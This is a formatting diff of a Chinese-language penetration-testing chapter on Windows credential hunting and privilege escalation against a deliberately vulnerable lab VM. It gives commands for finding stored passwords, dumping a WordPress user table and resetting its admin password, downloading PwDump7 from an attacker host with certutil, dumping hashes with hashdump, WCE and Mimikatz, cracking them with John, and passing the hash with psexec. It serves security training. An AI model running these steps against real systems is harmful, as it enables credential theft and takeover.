@@ -4,7 +4,7 @@
 
 本章将重点讲解如何使用各种工具和技术在目标系统上搜索密码并导出密码哈希值的过程。
 
-我们还将了解如何破解 Windows **NT LAN Manager**（**NTLM**）哈希值，并利用这些哈希值在目标系统上提升特权。
+我们还将了解如何破解 Windows `NT LAN Manager`（**NTLM**）哈希值，并利用这些哈希值在目标系统上提升特权。
 
 本章将涵盖以下主要内容：
 
@@ -34,7 +34,7 @@
 
 还需要理解的是，这个过程依赖于一系列漏洞，这些漏洞通常源于组织或个人的密码安全实践。差劲的密码安全实践是攻击者的主要目标，因为它们提供了一个直接的访问通道，无需进一步的系统利用或破坏。
 
-由于各种平台和应用程序需要大量凭证，员工和个人倾向于将凭证以明文形式保存在他们的系统中，通常保存在 **.doc**、**.txt** 或 **.xlsx** 文件中以便于访问，并且更可能使用较弱的密码，这些密码通常与他们相关的事件、名字或日期相关。这对组织的安全构成了重大威胁，因此大多数组织都会强制执行密码安全政策，以解决这些问题。
+由于各种平台和应用程序需要大量凭证，员工和个人倾向于将凭证以明文形式保存在他们的系统中，通常保存在 `.doc`、`.txt` 或 `.xlsx` 文件中以便于访问，并且更可能使用较弱的密码，这些密码通常与他们相关的事件、名字或日期相关。这对组织的安全构成了重大威胁，因此大多数组织都会强制执行密码安全政策，以解决这些问题。
 
 密码安全策略用于建立用户账户密码的基本安全级别，并强制要求安全存储和使用更强的密码，这些密码应包含字母（大写和小写）、符号和数字，且建议最短长度为 8 位。然而，这也导致了密码重用现象的出现，员工和个人可能会将相同的密码用于多个账户，主要是因为他们需要使用的密码复杂。这使得攻击者可以通过破解一个密码访问多个账户。
 
@@ -44,7 +44,7 @@
 
 在本章中，我们将使用在 *第二章* *设置我们的实验室* 中设置的 Metasploitable3 目标虚拟机。
 
-Metasploitable3 是一台故意设置漏洞的虚拟机，运行在 **Windows Server 2008 R2** 上，并托管了大量应用程序，从 Web 应用到数据库。
+Metasploitable3 是一台故意设置漏洞的虚拟机，运行在 `Windows Server 2008 R2` 上，并托管了大量应用程序，从 Web 应用到数据库。
 
 这个强大的应用配置提供了一个很好的现实场景，可以用来实际演示我们将在本章中使用的工具和技术。
 
@@ -58,19 +58,19 @@ Metasploitable3 是一台故意设置漏洞的虚拟机，运行在 **Windows Se
 
 我们将通过以下不同的程序开始这一过程：
 
-+   第一步是搜索本地文件系统中的特定字符串。在本例中，我们要搜索的字符串是**password**。这将列出该字符串的所有出现位置、其值、对应的文件名及其位置。可以通过在 Windows 命令行中运行**findstr**工具来实现：
++   第一步是搜索本地文件系统中的特定字符串。在本例中，我们要搜索的字符串是`password`。这将列出该字符串的所有出现位置、其值、对应的文件名及其位置。可以通过在 Windows 命令行中运行`findstr`工具来实现：
 
-    **findstr /si password *.txt**
+    `findstr /si password *.txt`
 
-    该命令将执行区分大小写的搜索，查找所有子目录中的**password**字符串。
+    该命令将执行区分大小写的搜索，查找所有子目录中的`password`字符串。
 
     注意
 
-    **findstr**是一个用于在文件中搜索字符串的 Windows 工具，可以与各种正则表达式结合使用，以微调你的搜索。
+    `findstr`是一个用于在文件中搜索字符串的 Windows 工具，可以与各种正则表达式结合使用，以微调你的搜索。
 
-    为了执行彻底的搜索，建议在 Windows 文件系统的根目录运行**findstr**工具。可以通过导航到**C:\\**目录并从那里开始搜索来实现。
+    为了执行彻底的搜索，建议在 Windows 文件系统的根目录运行`findstr`工具。可以通过导航到`C:\\`目录并从那里开始搜索来实现。
 
-    这将输出所有包含**password**字符串的**.txt**文件列表，如下所示的屏幕截图所示：
+    这将输出所有包含`password`字符串的`.txt`文件列表，如下所示的屏幕截图所示：
 
 ![图 7.1 – findstr 结果](img/B17389_07_001.jpg)
 
@@ -78,15 +78,15 @@ Metasploitable3 是一台故意设置漏洞的虚拟机，运行在 **Windows Se
 
 根据系统配置和已安装的应用程序数量，该命令将输出大量信息。因此，建议将结果输出到文件中进行深入分析，因为手动分析结果可能会非常繁琐。
 
-+   我们还可以使用**findstr**工具在***.xml**文件中搜索**password**字符串。可以通过运行以下命令来实现：
++   我们还可以使用`findstr`工具在`*.xml`文件中搜索`password`字符串。可以通过运行以下命令来实现：
 
-    **findstr /si password *.xml**
+    `findstr /si password *.xml`
 
-    如下所示，这将输出所有**.xml**文件中**password**字符串的出现位置列表。
+    如下所示，这将输出所有`.xml`文件中`password`字符串的出现位置列表。
 
     你还可以通过运行以下命令来微调搜索，限制结果仅显示包含字符串的文件：
 
-    **findstr /si /m "password" *.xml *.ini *.txt**
+    `findstr /si /m "password" *.xml *.ini *.txt`
 
     这将限制搜索输出，仅显示包含搜索查询中指定字符串的文件：
 
@@ -96,15 +96,15 @@ Metasploitable3 是一台故意设置漏洞的虚拟机，运行在 **Windows Se
 
 +   我们还可以对目标系统中所有文件和目录进行综合搜索，查找特定字符串。可以通过运行以下命令来实现：
 
-    **findstr /spin "password" *.* -**
+    `findstr /spin "password" *.* -`
 
-    该命令将输出所有文件，无论其格式或扩展名，只要文件中包含**password**字符串。
+    该命令将输出所有文件，无论其格式或扩展名，只要文件中包含`password`字符串。
 
     根据目标的部署用例，你可能会收到很多匹配项，或者完全没有匹配项。我们将在下一节中详细介绍如何根据我们寻找的密码类型来微调搜索。
 
-+   我们还可以通过在 Windows 上使用**dir**命令在文件中搜索各种字符串。可以通过运行以下命令来实现：
++   我们还可以通过在 Windows 上使用`dir`命令在文件中搜索各种字符串。可以通过运行以下命令来实现：
 
-    **dir /s *pass* == *cred* == *vnc* == *.config***
+    `dir /s *pass* == *cred* == *vnc* == *.config*`
 
     如下图所示，该命令将输出指定字符串的所有出现及其相应的位置。这种扫描更加全面，并具有更高的返回有用和可操作结果的概率：
 
@@ -112,7 +112,7 @@ Metasploitable3 是一台故意设置漏洞的虚拟机，运行在 **Windows Se
 
 图 7.3 – 目录搜索结果
 
-如前面的屏幕截图所示，搜索显示了包含搜索中指定字符串的文件的位置。在这种特定情况下，我们可以识别出**GlassFish**服务器的本地和域密码的位置。我们可以使用这些凭据控制该服务。
+如前面的屏幕截图所示，搜索显示了包含搜索中指定字符串的文件的位置。在这种特定情况下，我们可以识别出`GlassFish`服务器的本地和域密码的位置。我们可以使用这些凭据控制该服务。
 
 在接下来的章节中，我们将详细介绍如何搜索特定于应用程序的密码及其如何用于提升我们的权限。
 
@@ -128,9 +128,9 @@ Windows 可以自动化各种重复的任务，例如在多个系统上大规模
 
 1.  第一步是搜索并识别剩余的无人值守 Windows 安装配置文件。配置文件的名称会根据已安装的 Windows 版本而异。该文件通常具有以下名称之一：
 
-    - **Unattend.xml**
+    - `Unattend.xml`
 
-    - **Autounattend.xml**
+    - `Autounattend.xml`
 
     配置文件的位置也取决于已安装的 Windows 版本，并且通常可以在以下位置之一找到：
 
@@ -140,7 +140,7 @@ Windows 可以自动化各种重复的任务，例如在多个系统上大规模
 
     如下终端输出所示，如果配置文件存在，它应该包含**管理员**密码的明文或以 Base64 编码的密码，经过解码后即可揭示明文密码：
 
-    **<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">**
+    `<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">`
 
     **    <AutoLogon>**
 
@@ -172,15 +172,15 @@ Windows 可以自动化各种重复的任务，例如在多个系统上大规模
 
     使用 Kali Linux 上的内置 base64 工具可以解密加密密码。可以通过运行以下命令来完成：
 
-    **echo "<ENCRYPTED-PASSWORD>" | base64 -d**
+    `echo "<ENCRYPTED-PASSWORD>" | base64 -d`
 
-1.  Windows 安装也可以通过名为 **Sysprep** 的 Windows 工具进行自动化。Sysprep 用于将 Windows 镜像部署到不同的系统，并且也可以与 Windows 无人值守安装工具配合使用，来为镜像的部署做好准备。
+1.  Windows 安装也可以通过名为 `Sysprep` 的 Windows 工具进行自动化。Sysprep 用于将 Windows 镜像部署到不同的系统，并且也可以与 Windows 无人值守安装工具配合使用，来为镜像的部署做好准备。
 
-    同样，**Sysprep** 也利用包含定制内容和用户凭据的配置文件。如果这些文件没有被清理，它们可能会泄露有用的凭据信息。配置文件的名称会根据安装的 Windows 版本有所不同。该文件通常具有以下名称之一：
+    同样，`Sysprep` 也利用包含定制内容和用户凭据的配置文件。如果这些文件没有被清理，它们可能会泄露有用的凭据信息。配置文件的名称会根据安装的 Windows 版本有所不同。该文件通常具有以下名称之一：
 
-    - **Sysprep.inf**
+    - `Sysprep.inf`
 
-    - **Sysprep.xml**
+    - `Sysprep.xml`
 
     配置文件的位置还取决于安装的 Windows 版本，通常可以在以下位置找到：
 
@@ -200,9 +200,9 @@ Windows 可以自动化各种重复的任务，例如在多个系统上大规模
 
 1.  Windows 中另一个重要的部分是注册表。Windows 注册表是一个数据库，负责存储 Windows 系统及其他安装在系统中的应用程序的设置和配置。我们可以搜索注册表中的特定字符串来揭示用户凭据。这可以通过运行以下命令来完成：
 
-    **reg query HKLM /f password /t REG_SZ /s**
+    `reg query HKLM /f password /t REG_SZ /s`
 
-    **reg query HKCU /f password /t REG_SZ /s**
+    `reg query HKCU /f password /t REG_SZ /s`
 
     如下截图所示，这将输出所有匹配**密码**字符串的注册表项：
 
@@ -228,13 +228,13 @@ Windows 可以自动化各种重复的任务，例如在多个系统上大规模
 
 让我们来学习如何查找和识别这些应用程序用来存储凭证的配置文件：
 
-1.  该过程的第一步是识别正在使用的 web 托管堆栈。正如下面的截图所示，导航到文件系统根目录可以揭示已安装的托管堆栈是 **Windows Apache MySQL PHP**（**WAMP**）：![图 7.6 – WAMP](img/B17389_07_006.jpg)
+1.  该过程的第一步是识别正在使用的 web 托管堆栈。正如下面的截图所示，导航到文件系统根目录可以揭示已安装的托管堆栈是 `Windows Apache MySQL PHP`（**WAMP**）：![图 7.6 – WAMP](img/B17389_07_006.jpg)
 
     图 7.6 – WAMP
 
-    我们可以通过浏览 **wamp** 目录的内容来确定托管了哪些 web 应用程序。可以通过运行以下命令来实现：
+    我们可以通过浏览 `wamp` 目录的内容来确定托管了哪些 web 应用程序。可以通过运行以下命令来实现：
 
-    **cd wamp\www\**
+    `cd wamp\www\`
 
     正如下面的截图所示，目录的内容显示 WordPress 已安装在服务器上：
 
@@ -242,9 +242,9 @@ Windows 可以自动化各种重复的任务，例如在多个系统上大规模
 
     图 7.7 – WordPress 目录
 
-    **WordPress** 是一个内容管理系统，需要一个数据库——在这个案例中是 **MySQL**——来存储数据和用户凭证。通过远程连接来连接数据库，数据库的访问凭证存储在 **wp-config.php** 文件中。我们可以通过进入 WordPress 安装目录，并在 Windows 命令行中运行以下命令来列出此文件的内容：
+    `WordPress` 是一个内容管理系统，需要一个数据库——在这个案例中是 `MySQL`——来存储数据和用户凭证。通过远程连接来连接数据库，数据库的访问凭证存储在 `wp-config.php` 文件中。我们可以通过进入 WordPress 安装目录，并在 Windows 命令行中运行以下命令来列出此文件的内容：
 
-    **type wp-config.php**
+    `type wp-config.php`
 
     正如下面的截图所示，文件的内容揭示了我们可以用来登录的 MySQL 用户名和密码组合：
 
@@ -254,7 +254,7 @@ Windows 可以自动化各种重复的任务，例如在多个系统上大规模
 
 1.  在这种情况下，我们可以获取 MySQL 服务器的根用户名和密码，并通过运行以下命令从 Kali 远程登录：
 
-    **mysql -u root -p -h <TARGET-IP>**
+    `mysql -u root -p -h <TARGET-IP>`
 
     如以下截图所示，成功认证后，我们现在应当能够访问 MySQL 服务器的根权限，并查看和导出服务器上任何数据库的内容：
 
@@ -266,7 +266,7 @@ Windows 可以自动化各种重复的任务，例如在多个系统上大规模
 
 1.  我们现在可以导出服务器上的数据库列表。可以通过在 MySQL 提示符下运行以下命令来完成：
 
-    **show databases;**
+    `show databases;`
 
     如以下截图所示，该命令将输出服务器上的数据库列表：
 
@@ -276,11 +276,11 @@ Windows 可以自动化各种重复的任务，例如在多个系统上大规模
 
 1.  我们可以通过在 MySQL 提示符下运行以下命令来导出 WordPress 数据库的内容：
 
-    **use wordpress;**
+    `use wordpress;`
 
     这将显示 WordPress 数据库中的表格列表。我们可以通过运行以下命令导出 WordPress 安装的用户凭证：
 
-    **select * from wp_users;**
+    `select * from wp_users;`
 
     如以下截图所示，这将揭示 WordPress 用户的凭证：
 
@@ -294,7 +294,7 @@ Windows 可以自动化各种重复的任务，例如在多个系统上大规模
 
 1.  此外，鉴于我们已拥有 MySQL 服务器的根权限，我们可以通过运行以下命令来更改管理员账户的密码：
 
-    **update wp_users set user_pass = MD5('password123!') where ID = 1;**
+    `update wp_users set user_pass = MD5('password123!') where ID = 1;`
 
     我们现在可以使用刚刚设置的密码登录 WordPress 管理后台，并应拥有对 WordPress 网站的管理员控制权限。
 
@@ -302,7 +302,7 @@ Windows 可以自动化各种重复的任务，例如在多个系统上大规模
 
 1.  服务器还在运行 phpMyAdmin。我们可以通过访问该文件的内容来访问 phpMyAdmin 控制面板，如下所示：
 
-    **C:\wamp\apps\phpmyadmin3.4.10.1\config.inc.ini.php**
+    `C:\wamp\apps\phpmyadmin3.4.10.1\config.inc.ini.php`
 
     如以下截图所示，这将揭示 phpMyAdmin 控制面板的访问凭证：
 
@@ -328,7 +328,7 @@ SAM 数据库存储在 Windows 注册表中，可以从以下位置访问：
 
 HKEY_LOCAL_MACHINE\SAM
 
-现在我们知道了 Windows 用户凭据存储的位置，我们需要更仔细地查看**LanMan**（**LM**）和 NTLM 认证。
+现在我们知道了 Windows 用户凭据存储的位置，我们需要更仔细地查看`LanMan`（**LM**）和 NTLM 认证。
 
 ## LM 和 NTLM 哈希
 
@@ -372,7 +372,7 @@ NTLM 操作基于挑战应答系统，哈希过程可以分解为以下步骤：
 
 ### 使用 PwDump7
 
-我们将使用的第一个工具是**PwDump7.exe**。它是一个 Windows 二进制程序，用于提取 SAM 数据库并转储哈希值。它需要在目标系统上本地运行。您可以通过以下链接下载该二进制文件：[`www.tarasco.org/security/pwdump_7/`](https://www.tarasco.org/security/pwdump_7/)。
+我们将使用的第一个工具是`PwDump7.exe`。它是一个 Windows 二进制程序，用于提取 SAM 数据库并转储哈希值。它需要在目标系统上本地运行。您可以通过以下链接下载该二进制文件：[`www.tarasco.org/security/pwdump_7/`](https://www.tarasco.org/security/pwdump_7/)。
 
 下载二进制文件后，我们需要将其传输到目标系统。这可以通过 meterpreter 自动完成，方法是在 meterpreter shell 中运行以下命令：
 
@@ -380,13 +380,13 @@ NTLM 操作基于挑战应答系统，哈希过程可以分解为以下步骤：
 
 或者，如果您使用的是标准命令行，我们需要在 Kali 虚拟机上设置一个 Web 服务器。这个服务器将用于托管二进制文件，以便我们可以在目标系统上下载它。可以按照这里概述的步骤来完成：
 
-要在我们的 Kali 虚拟机上设置一个 Web 服务器，我们可以使用**SimpleHTTPServer** Python 模块来提供二进制文件。这可以通过在存储**PwDump7.exe**二进制文件的目录中运行以下命令来完成：
+要在我们的 Kali 虚拟机上设置一个 Web 服务器，我们可以使用`SimpleHTTPServer` Python 模块来提供二进制文件。这可以通过在存储`PwDump7.exe`二进制文件的目录中运行以下命令来完成：
 
 sudo python -m SimpleHTTPServer 80
 
-要在目标系统上下载**PwDump7.exe**二进制文件，我们可以使用**certutil**工具。然而，在下载二进制文件之前，我们需要导航到一个具有读写权限的目录。在这种情况下，我们将导航到当前用户的**桌面**目录。
+要在目标系统上下载`PwDump7.exe`二进制文件，我们可以使用`certutil`工具。然而，在下载二进制文件之前，我们需要导航到一个具有读写权限的目录。在这种情况下，我们将导航到当前用户的**桌面**目录。
 
-现在我们可以使用**certutil**工具将二进制文件从 Kali 虚拟机下载到目标系统。这可以通过在目标系统上运行以下命令来完成：
+现在我们可以使用`certutil`工具将二进制文件从 Kali 虚拟机下载到目标系统。这可以通过在目标系统上运行以下命令来完成：
 
 certutil -urlcache -f http://<KALI-VM-IP>/PwDump7.exe PwDump7.exe
 
@@ -446,7 +446,7 @@ samdump2 system sam
 
 这将从 SAM 文件中提取哈希值，我们现在可以破解这些哈希以获取明文密码。
 
-此过程也可以通过使用 **hashdump** meterpreter 命令来自动化，命令如下：
+此过程也可以通过使用 `hashdump` meterpreter 命令来自动化，命令如下：
 
 hashdump
 
@@ -458,17 +458,17 @@ hashdump
 
 图 7.17 – Hashdump
 
-在这种情况下，**hashdump** 命令会显示系统上所有用户帐户的哈希值。我们可以将这些哈希保存到名为 **hashes.txt** 的文件中，保存在我们的 Kali 虚拟机上。接下来，我们将讨论如何使用这些哈希值。
+在这种情况下，`hashdump` 命令会显示系统上所有用户帐户的哈希值。我们可以将这些哈希保存到名为 `hashes.txt` 的文件中，保存在我们的 Kali 虚拟机上。接下来，我们将讨论如何使用这些哈希值。
 
 ### 使用 Windows 凭据编辑器
 
-另一个我们可以使用的强大工具是 **Windows 凭据编辑器**，也叫做 **WCE**。WCE 列出了登录会话及其对应的 NTLM 哈希。该二进制文件预装在 Kali 中，需要在目标系统上本地运行。
+另一个我们可以使用的强大工具是 **Windows 凭据编辑器**，也叫做 `WCE`。WCE 列出了登录会话及其对应的 NTLM 哈希。该二进制文件预装在 Kali 中，需要在目标系统上本地运行。
 
 我们可以通过运行以下命令，使用 meterpreter 将二进制文件上传到目标系统：
 
 upload /usr/share/windows-resources/wce/wce64.exe
 
-如果您使用的是标准命令行 shell，可以使用 **certutil** 工具将二进制文件传输到目标系统。
+如果您使用的是标准命令行 shell，可以使用 `certutil` 工具将二进制文件传输到目标系统。
 
 将二进制文件传输到目标系统后，我们可以通过运行以下命令执行该二进制文件：
 
@@ -484,7 +484,7 @@ upload /usr/share/windows-resources/wce/wce64.exe
 
 在这种情况下，我们只能提取当前登录用户的哈希值。
 
-我们还可以使用 **wce.exe** 二进制文件来提取密码哈希及其对应的明文。这可以通过运行以下命令来完成：
+我们还可以使用 `wce.exe` 二进制文件来提取密码哈希及其对应的明文。这可以通过运行以下命令来完成：
 
 .\wce64.exe -w
 
@@ -500,7 +500,7 @@ upload /usr/share/windows-resources/wce/wce64.exe
 
 use post/windows/gather/credential/credential_collector
 
-现在，我们需要配置该模块并更改相关的模块选项。在这种情况下，唯一需要配置的选项是**SESSION**选项。我们可以通过运行以下命令来设置**SESSION**选项：
+现在，我们需要配置该模块并更改相关的模块选项。在这种情况下，唯一需要配置的选项是`SESSION`选项。我们可以通过运行以下命令来设置`SESSION`选项：
 
 set SESSION <SESSION-ID>
 
@@ -546,7 +546,7 @@ Mimikatz 是一个开源应用程序，允许攻击者查看和保存 Windows �
 
 upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
 
-如果你使用的是标准命令 shell，可以使用**certutil**工具将二进制文件传输到目标系统。
+如果你使用的是标准命令 shell，可以使用`certutil`工具将二进制文件传输到目标系统。
 
 注意
 
@@ -604,9 +604,9 @@ lsadump_sam
 
 John the Ripper 是一款开源的密码安全、审计和恢复工具，支持大量的哈希值和加密方式。在我们的案例中，我们将使用 John the Ripper 破解 Windows NTLM 哈希值。
 
-John the Ripper 随 Kali Linux 一起预安装，第一步是将我们在哈希提取部分中提取的密码哈希保存到 Kali Linux 中的一个文件中，最好是 **.txt** 文件。
+John the Ripper 随 Kali Linux 一起预安装，第一步是将我们在哈希提取部分中提取的密码哈希保存到 Kali Linux 中的一个文件中，最好是 `.txt` 文件。
 
-在我们的案例中，我们将文件命名为 **hashes.txt** 并将文件保存在 Kali Linux 的 **Desktop** 目录中。
+在我们的案例中，我们将文件命名为 `hashes.txt` 并将文件保存在 Kali Linux 的 `Desktop` 目录中。
 
 文件内容应与以下类似：
 
@@ -626,7 +626,7 @@ sudo john –format=NT hashes.txt
 
 你可能还需要限制哈希文件中的哈希数量，只保留最重要的哈希，甚至是管理员账户的哈希。
 
-在这个特定的案例中，John 破解了**管理员**和**vagrant**用户账户的哈希值，如以下截图所示：
+在这个特定的案例中，John 破解了**管理员**和`vagrant`用户账户的哈希值，如以下截图所示：
 
 ![图 7.26 – 破解的哈希值](img/B17389_07_026.jpg)
 
@@ -640,13 +640,13 @@ sudo john –format=NT hashes.txt
 
 ### 使用传递哈希技术
 
-我们将使用的第一个技术被称为*传递哈希*。它涉及使用已导出的哈希进行目标身份验证——在这个例子中是管理员哈希。这个攻击可以通过 Metasploit 模块自动化，该模块利用了 Windows 上的**PsExec**命令行工具。该工具允许你在远程系统上执行程序。
+我们将使用的第一个技术被称为*传递哈希*。它涉及使用已导出的哈希进行目标身份验证——在这个例子中是管理员哈希。这个攻击可以通过 Metasploit 模块自动化，该模块利用了 Windows 上的`PsExec`命令行工具。该工具允许你在远程系统上执行程序。
 
 我们可以在将 meterpreter 会话置于后台后，在 Metasploit 中加载该模块，方法是运行以下命令：
 
 使用 exploit/windows/smb/psexec
 
-加载模块后，我们需要配置模块选项。在这种情况下，我们需要配置**RHOSTS**选项，并配置**服务器消息块**（**SMB**）凭据。我们将**SMBUser**设置为**Administrator**，并将**SMBPass**选项设置为管理员哈希，如下截图所示：
+加载模块后，我们需要配置模块选项。在这种情况下，我们需要配置`RHOSTS`选项，并配置**服务器消息块**（**SMB**）凭据。我们将`SMBUser`设置为`Administrator`，并将`SMBPass`选项设置为管理员哈希，如下截图所示：
 
 ![图 7.27 – psexec 模块选项](img/B17389_07_027.jpg)
 
@@ -666,7 +666,7 @@ sudo john –format=NT hashes.txt
 
 ### 使用 Remmina
 
-在我们对目标进行初步的 Nmap 扫描时，发现**远程桌面协议**（**RDP**）服务运行在默认配置端口，也就是**3389**。我们可以利用破解出的管理员账户明文密码来进行身份验证，并与服务器建立具有提升权限的远程桌面连接。
+在我们对目标进行初步的 Nmap 扫描时，发现**远程桌面协议**（**RDP**）服务运行在默认配置端口，也就是`3389`。我们可以利用破解出的管理员账户明文密码来进行身份验证，并与服务器建立具有提升权限的远程桌面连接。
 
 这可以通过使用像 Remmina 这样的 RDP 客户端来实现，Remmina 是 Kali Linux 中预装的工具。
 
